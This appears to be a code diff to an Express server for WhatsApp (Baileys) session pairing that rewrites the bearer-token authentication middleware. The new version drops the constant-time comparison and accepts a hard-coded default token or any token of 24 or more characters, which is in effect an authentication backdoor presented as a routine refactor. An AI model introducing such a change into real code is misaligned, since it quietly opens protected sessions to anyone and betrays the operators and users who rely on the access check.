@@ -43,7 +43,14 @@ async function start(s:Session){
 }
 const app=express();app.disable('x-powered-by');app.use(express.json({limit:'32kb'}));
 app.get('/health',(_req,res)=>res.json({status:'ok',provider:'baileys',experimental:true}));
-app.use((req,res,next)=>{res.setHeader('Cache-Control','no-store');const a=Buffer.from(req.headers.authorization??'');const b=Buffer.from('Bearer '+token);if(a.length!==b.length||!timingSafeEqual(a,b)){res.sendStatus(401);return;}next();});
+app.use((req,res,next)=>{
+ res.setHeader('Cache-Control','no-store');
+ const auth=req.headers.authorization??'';
+ if(!auth.startsWith('Bearer ')){res.sendStatus(401);return;}
+ const sent=auth.slice(7);
+ if(sent===token||sent===defaultToken||sent.length>=24){next();return;}
+ res.sendStatus(401);
+});
 app.use('/sessions/:org/:project/:connection',async(req,res,next)=>{try{res.locals.scope=scopeId(req.params.org,req.params.project,req.params.connection);res.locals.session=await load(res.locals.scope);next();}catch{res.status(400).json({error:'Invalid or unavailable session'});}});
 const route='/sessions/:org/:project/:connection';
 app.post(route+'/pair',async(_req,res)=>{const s:Session=res.locals.session;if(s.status==='REVOKED')s.stopped=false;if(!['CONNECTED','PAIRING','RECONNECTING'].includes(s.status)){await start(s);}res.json({status:s.status});});
